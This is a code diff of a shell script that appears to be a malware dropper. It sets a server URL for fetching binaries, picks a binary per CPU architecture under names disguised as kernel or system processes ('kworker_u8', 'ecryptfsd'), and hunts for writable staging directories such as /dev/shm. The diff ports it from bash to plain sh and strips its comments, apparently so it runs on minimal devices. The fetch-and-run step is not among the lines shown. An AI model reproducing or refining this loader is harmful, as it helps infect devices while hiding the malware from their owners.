@@ -1,16 +1,14 @@
-#!/bin/bash
+#!/bin/sh
 
 SRV="http://127.0.0.1/bins"
 
-# ── Endianness helper ──
 is_le() {
-    (echo -n I | od -to2 | awk '{print $2; exit}' | grep -q "49") && return 0 || return 1
+    echo -n I | od -to2 | awk '{print $2; exit}' | grep -q "49"
 }
 
-# ── Detect architecture ──
 detect_arch() {
-    local arch=$(uname -m | tr '[:upper:]' '[:lower:]')
-    local BIN_NAME="ecryptfsd"
+    arch=$(uname -m | tr '[:upper:]' '[:lower:]')
+    BIN_NAME="ecryptfsd"
 
     case "$arch" in
         x86_64|amd64|x64|x86-64)            BIN_NAME="kworker_u8" ;;
@@ -31,22 +29,17 @@ detect_arch() {
     echo "$BIN_NAME"
 }
 
-# ── Find writable directory for binary ──
 find_writable_dir() {
-    local dirs=("/dev/shm" "/tmp" "/var/system" "/mnt" "/root" "/var/tmp" "/run" "/dev")
-
-    for dir in "${dirs[@]}"; do
+    for dir in /dev/shm /tmp /var/system /mnt /var/tmp /run /dev; do
         if [ -d "$dir" ] && [ -w "$dir" ]; then
             echo "$dir"
             return 0
         fi
     done
-
     if [ -w "." ]; then
         echo "."
         return 0
     fi
-
     return 1
 }
 
